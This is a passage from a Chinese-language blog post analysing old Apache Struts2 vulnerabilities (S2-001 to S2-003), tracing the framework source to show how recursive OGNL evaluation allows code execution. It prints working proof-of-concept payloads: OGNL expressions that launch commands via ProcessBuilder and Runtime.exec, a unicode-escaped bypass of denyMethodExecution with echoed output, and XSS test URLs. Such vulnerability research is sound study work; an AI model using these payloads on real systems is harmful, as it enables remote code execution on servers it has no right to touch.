</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>.</span><span class=na>component</span><span class=o>.</span><span class=na>setId</span><span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>id</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=n>Component</span> <span class=nf>getComponent</span><span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>this</span><span class=o>.</span><span class=na>component</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>漏洞就发生在 <code>doEndTag()</code> 中：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kt>int</span> <span class=nf>doEndTag</span><span class=o>()</span> <span class=kd>throws</span> <span class=n>JspException</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>this</span><span class=o>.</span><span class=na>component</span><span class=o>.</span><span class=na>end</span><span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>pageContext</span><span class=o>.</span><span class=na>getOut</span><span class=o>(),</span> <span class=k>this</span><span class=o>.</span><span class=na>getBody</span><span class=o>());</span>
</span></span><span class=line><span class=cl>    <span class=k>this</span><span class=o>.</span><span class=na>component</span> <span class=o>=</span> <span class=kc>null</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>6</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这里 <code>this.pageContext.getOut()</code> 获取的就是一个 <code>Writer</code> 对象，使用这个 <code>Writer</code> 来输出渲染后的struts2标签。我们继续跟进 <code>this.component.end()</code> 来查看渲染的逻辑：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// org.apache.struts2.components.UIBean#end()
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>public</span> <span class=kt>boolean</span> <span class=nf>end</span><span class=o>(</span><span class=n>Writer</span> <span class=n>writer</span><span class=o>,</span> <span class=n>String</span> <span class=n>body</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>this</span><span class=o>.</span><span class=na>evaluateParams</span><span class=o>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>super</span><span class=o>.</span><span class=na>end</span><span class=o>(</span><span class=n>writer</span><span class=o>,</span> <span class=n>body</span><span class=o>,</span> <span class=kc>false</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>.</span><span class=na>mergeTemplate</span><span class=o>(</span><span class=n>writer</span><span class=o>,</span> <span class=k>this</span><span class=o>.</span><span class=na>buildTemplateName</span><span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>template</span><span class=o>,</span> <span class=k>this</span><span class=o>.</span><span class=na>getDefaultTemplate</span><span class=o>()));</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>Exception</span> <span class=n>var7</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>LOG</span><span class=o>.</span><span class=na>error</span><span class=o>(</span><span class=s>&#34;error when rendering&#34;</span><span class=o>,</span> <span class=n>var7</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>finally</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>.</span><span class=na>popComponentStack</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>false</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>继续跟进 <code>this.evaluateParams()</code> ：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// org.apache.struts2.components.UIBean#evaluateParams()
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>evaluateNameValue</span><span class=o>())</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>Class</span> <span class=n>valueClazz</span> <span class=o>=</span> <span class=k>this</span><span class=o>.</span><span class=na>getValueClassType</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>valueClazz</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>value</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>this</span><span class=o>.</span><span class=na>addParameter</span><span class=o>(</span><span class=s>&#34;nameValue&#34;</span><span class=o>,</span> <span class=k>this</span><span class=o>.</span><span class=na>findValue</span><span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>value</span><span class=o>,</span> <span class=n>valueClazz</span><span class=o>));</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=n>name</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>String</span> <span class=n>expr</span> <span class=o>=</span> <span class=n>name</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>altSyntax</span><span class=o>())</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>expr</span> <span class=o>=</span> <span class=s>&#34;%{&#34;</span> <span class=o>+</span> <span class=n>name</span> <span class=o>+</span> <span class=s>&#34;}&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>this</span><span class=o>.</span><span class=na>addParameter</span><span class=o>(</span><span class=s>&#34;nameValue&#34;</span><span class=o>,</span> <span class=k>this</span><span class=o>.</span><span class=na>findValue</span><span class=o>(</span><span class=n>expr</span><span class=o>,</span> <span class=n>valueClazz</span><span class=o>));</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这里的name就是前面index.jsp中使用的struts2标签中的name属性：username或者password。可以看到 <code>expr = "%{" + name + "}"</code> 将name包裹成 <code>%{xxxxx}</code> 的形式，然后调用 <code>this.findValue(expr, valueClazz)</code> 来查找表达式对应的参数值。一路跟进，最终发现在 <code>com.opensymphony.xwork2.util.TextParseUtil#translateVariables()</code> 中从OgnlValueStack中获取参数值，并且是一个while循环获取，也就是获取到的参数值可以作为参数名继续进行查询（也就是Ognl递归解析）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=n>Object</span> <span class=nf>translateVariables</span><span class=o>(</span><span class=kt>char</span> <span class=n>open</span><span class=o>,</span> <span class=n>String</span> <span class=n>expression</span><span class=o>,</span> <span class=n>ValueStack</span> <span class=n>stack</span><span class=o>,</span> <span class=n>Class</span> <span class=n>asType</span><span class=o>,</span> <span class=n>TextParseUtil</span><span class=o>.</span><span class=na>ParsedValueEvaluator</span> <span class=n>evaluator</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>Object</span> <span class=n>result</span> <span class=o>=</span> <span class=n>expression</span><span class=o>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span><span class=o>(</span><span class=kc>true</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>start</span> <span class=o>=</span> <span class=n>expression</span><span class=o>.</span><span class=na>indexOf</span><span class=o>(</span><span class=n>open</span> <span class=o>+</span> <span class=s>&#34;{&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>length</span> <span class=o>=</span> <span class=n>expression</span><span class=o>.</span><span class=na>length</span><span class=o>();</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>x</span> <span class=o>=</span> <span class=n>start</span> <span class=o>+</span> <span class=n>2</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>count</span> <span class=o>=</span> <span class=n>1</span><span class=o>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>while</span><span class=o>(</span><span class=n>start</span> <span class=o>!=</span> <span class=o>-</span><span class=n>1</span> <span class=o>&amp;&amp;</span> <span class=n>x</span> <span class=o>&lt;</span> <span class=n>length</span> <span class=o>&amp;&amp;</span> <span class=n>count</span> <span class=o>!=</span> <span class=n>0</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=kt>char</span> <span class=n>c</span> <span class=o>=</span> <span class=n>expression</span><span class=o>.</span><span class=na>charAt</span><span class=o>(</span><span class=n>x</span><span class=o>++);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=n>c</span> <span class=o>==</span> <span class=sc>&#39;{&#39;</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=o>++</span><span class=n>count</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=n>c</span> <span class=o>==</span> <span class=sc>&#39;}&#39;</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=o>--</span><span class=n>count</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>end</span> <span class=o>=</span> <span class=n>x</span> <span class=o>-</span> <span class=n>1</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>start</span> <span class=o>==</span> <span class=o>-</span><span class=n>1</span> <span class=o>||</span> <span class=n>end</span> <span class=o>==</span> <span class=o>-</span><span class=n>1</span> <span class=o>||</span> <span class=n>count</span> <span class=o>!=</span> <span class=n>0</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>XWorkConverter</span><span class=o>.</span><span class=na>getInstance</span><span class=o>().</span><span class=na>convertValue</span><span class=o>(</span><span class=n>stack</span><span class=o>.</span><span class=na>getContext</span><span class=o>(),</span> <span class=n>result</span><span class=o>,</span> <span class=n>asType</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>String</span> <span class=n>var</span> <span class=o>=</span> <span class=n>expression</span><span class=o>.</span><span class=na>substring</span><span class=o>(</span><span class=n>start</span> <span class=o>+</span> <span class=n>2</span><span class=o>,</span> <span class=n>end</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Object</span> <span class=n>o</span> <span class=o>=</span> <span class=n>stack</span><span class=o>.</span><span class=na>findValue</span><span class=o>(</span><span class=n>var</span><span class=o>,</span> <span class=n>asType</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>evaluator</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>o</span> <span class=o>=</span> <span class=n>evaluator</span><span class=o>.</span><span class=na>evaluate</span><span class=o>(</span><span class=n>o</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>String</span> <span class=n>left</span> <span class=o>=</span> <span class=n>expression</span><span class=o>.</span><span class=na>substring</span><span class=o>(</span><span class=n>0</span><span class=o>,</span> <span class=n>start</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>String</span> <span class=n>right</span> <span class=o>=</span> <span class=n>expression</span><span class=o>.</span><span class=na>substring</span><span class=o>(</span><span class=n>end</span> <span class=o>+</span> <span class=n>1</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>o</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=n>TextUtils</span><span class=o>.</span><span class=na>stringSet</span><span class=o>(</span><span class=n>left</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>result</span> <span class=o>=</span> <span class=n>left</span> <span class=o>+</span> <span class=n>o</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>result</span> <span class=o>=</span> <span class=n>o</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=n>TextUtils</span><span class=o>.</span><span class=na>stringSet</span><span class=o>(</span><span class=n>right</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>result</span> <span class=o>=</span> <span class=n>result</span> <span class=o>+</span> <span class=n>right</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>expression</span> <span class=o>=</span> <span class=n>left</span> <span class=o>+</span> <span class=n>o</span> <span class=o>+</span> <span class=n>right</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=n>left</span> <span class=o>+</span> <span class=n>right</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=n>expression</span> <span class=o>=</span> <span class=n>left</span> <span class=o>+</span> <span class=n>right</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/media/image-20210812155630477.png alt=image-20210812155630477></p><p>跟进，发现是使用 <code>OgnlUtil#getValue()</code> 来获取参数值：</p><p><img src=/media/image-20210812155841385.png alt=image-20210812155841385></p><p>继续跟进，发现存在Ognl表达式注入：</p><p><img src=/media/image-20210813095330883.png alt=image-20210813095330883></p><p>这里第一次 <code>Ognl.getValue()</code> 是获取password的参数值，也就是得到我们的恶意Ognl表达式： <code>%{(new java.lang.ProcessBuilder(new java.lang.String[]{"calc"})).start()}</code> 。但是Ognl解析并不会停止，而是在 <code>com.opensymphony.xwork2.util.TextParseUtil#translateVariables()</code> 中的while循环中继续触发Ognl解析。所以就造成了Ognl表达式注入RCE：</p><p><img src=/media/image-20210812160815973.png alt=image-20210812160815973></p><p>对于漏洞的修复，官方的做法就是限制Ognl的解析层数，默认只解析一层。</p><p>这里还存在一个疑问：为什么 <code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#doIntercept(ActionInvocation)</code> 中，设置了 <code>denyMethodExecution</code> 为true，这个漏洞还能打？</p><p>前面也说过， <code>ParametersInterceptor</code> 中调用 <code>setParameters()</code> 之后，还会设置 <code>denyMethodExecution</code> 为false。并且我们的Ognl表达式的解析是在 <code>ParametersInterceptor</code> 过滤器之后的操作（模板渲染发生在 <code>ParametersInterceptor</code> 过滤器过滤之后），所以此时 <code>denyMethodExecution</code> 为false，Ognl表达式能调用方法，所以能打。</p><p>RCE证明如下：</p><p><img src=/media/image-20210817164727799.png alt=image-20210817164727799></p><h2 id=s2-002>S2-002</h2><p>影响版本：Struts 2.0.0 - Struts 2.1.8.1</p><p>CVE编号：none</p><p>POC如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://127.0.0.1:8080/S2-001/?&lt;script&gt;alert(123);&lt;/script&gt;
</span></span><span class=line><span class=cl>http://127.0.0.1:8080/S2-001/?&lt;script xxx&gt;alert(123);&lt;/script&gt;
</span></span></code></pre></td></tr></table></div></div><p>XSS漏洞，不分析了。</p><h2 id=s2-003>S2-003</h2><p>影响版本：Struts 2.0.0 - Struts 2.1.8.1</p><p>CVE编号：none</p><p>POC如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// 以下通过的测试，均在Tomcat 8.5.38下可以打
</span></span></span><span class=line><span class=cl><span class=c1>// 无回显：
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023context</span><span class=o>[</span><span class=err>\&#39;</span><span class=n>xwork</span><span class=o>.</span><span class=na>MethodAccessor</span><span class=o>.</span><span class=na>denyMethodExecution</span><span class=err>\&#39;</span><span class=o>]</span><span class=err>\</span><span class=n>u003dfalse</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023myret</span><span class=err>\</span><span class=n>u003d</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=err>\&#39;</span><span class=n>calc</span><span class=err>\</span><span class=sc>&#39;)&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 带回显：
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023context</span><span class=o>[</span><span class=err>\&#39;</span><span class=n>xwork</span><span class=o>.</span><span class=na>MethodAccessor</span><span class=o>.</span><span class=na>denyMethodExecution</span><span class=err>\&#39;</span><span class=o>]</span><span class=err>\</span><span class=n>u003dfalse</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023_memberAccess</span><span class=o>.</span><span class=na>excludeProperties</span><span class=err>\</span><span class=n>u003d</span><span class=nd>@java.util.Collections@EMPTY_SET</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>kxlzx</span><span class=o>)(</span><span class=n>kxlzx</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023mycmd</span><span class=err>\</span><span class=n>u003d</span><span class=err>\&#39;</span><span class=n>ipconfig</span><span class=err>\&#39;&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023myret</span><span class=err>\</span><span class=n>u003d</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=err>\</span><span class=n>u0023mycmd</span><span class=o>)</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=n>A</span><span class=o>)((</span><span class=err>&#39;\</span><span class=n>u0023mydat</span><span class=err>\</span><span class=n>u003dnew</span><span class=err>\</span><span class=n>40java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>DataInputStream</span><span class=o>(</span><span class=err>\</span><span class=n>u0023myret</span><span class=o>.</span><span class=na>getInputStream</span><span class=o>())</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=n>B</span><span class=o>)((</span><span class=err>&#39;\</span><span class=n>u0023myres</span><span class=err>\</span><span class=n>u003dnew</span><span class=err>\</span><span class=n>40byte</span><span class=o>[</span><span class=n>51020</span><span class=o>]</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=n>C</span><span class=o>)((</span><span class=err>&#39;\</span><span class=n>u0023mydat</span><span class=o>.</span><span class=na>readFully</span><span class=o>(</span><span class=err>\</span><span class=n>u0023myres</span><span class=o>)</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=n>D</span><span class=o>)((</span><span class=err>&#39;\</span><span class=n>u0023mystr</span><span class=err>\</span><span class=n>u003dnew</span><span class=err>\</span><span class=n>40java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span><span class=o>(</span><span class=err>\</span><span class=n>u0023myres</span><span class=o>)</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023myout</span><span class=err>\</span><span class=n>u003d</span><span class=nd>@org.apache.struts2.ServletActionContext@getResponse</span><span class=o>()</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=n>E</span><span class=o>)((</span><span class=err>&#39;\</span><span class=n>u0023myout</span><span class=o>.</span><span class=na>getWriter</span><span class=o>().</span><span class=na>println</span><span class=o>(</span><span class=err>\</span><span class=n>u0023mystr</span><span class=o>)</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 复现失败：
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023_memberAccess</span><span class=o>[</span><span class=err>\&#39;</span><span class=n>allowStaticMethodAccess</span><span class=err>\</span><span class=sc>&#39;]&#39;</span><span class=o>)(</span><span class=n>vaaa</span><span class=o>)=</span><span class=kc>true</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=n>aaaa</span><span class=o>)((</span><span class=err>&#39;\</span><span class=n>u0023context</span><span class=o>[</span><span class=err>\&#39;</span><span class=n>xwork</span><span class=o>.</span><span class=na>MethodAccessor</span><span class=o>.</span><span class=na>denyMethodExecution</span><span class=err>\&#39;</span><span class=o>]</span><span class=err>\</span><span class=n>u003d</span><span class=err>\</span><span class=n>u0023vccc</span><span class=err>&#39;</span><span class=o>)(</span><span class=err>\</span><span class=n>u0023vccc</span><span class=err>\</span><span class=n>u003dnew</span> <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>Boolean</span><span class=o>(</span><span class=s>&#34;false&#34;</span><span class=o>)))</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=n>asdf</span><span class=o>)((</span><span class=err>&#39;\</span><span class=n>u0023rt</span><span class=o>.</span><span class=na>exec</span><span class=o>(</span><span class=s>&#34;calc&#34;</span><span class=o>.</span><span class=na>split</span><span class=o>(</span><span class=s>&#34;@&#34;</span><span class=o>))</span><span class=err>&#39;</span><span class=o>)(</span><span class=err>\</span><span class=n>u0023rt</span><span class=err>\</span><span class=n>u003d</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=o>()))=</span><span class=n>1</span>
</span></span></code></pre></td></tr></table></div></div><p>这个漏洞，说白了就是一个编码绕过，前面说过Ognl支持UNICODE编码，于是就可以使用UNICODE编码绕过。</p><p>首先看到入口 <code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#intercept()</code> ，往OgnlValueStack中设置值之前，会先设置禁止调用方法：</p><p><img src=/media/image-20210813111704930.png alt=image-20210813111704930></p><p>继续跟进 <code>this.setParameter()</code> ，发现会对请求参数名进行验证：</p><p><img src=/media/image-20210813111941612.png alt=image-20210813111941612></p><p>看到参数名的检查逻辑：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>protected</span> <span class=kt>boolean</span> <span class=nf>acceptableName</span><span class=o>(</span><span class=n>String</span> <span class=n>name</span><span class=o>)</span> <span class=o>{</span>
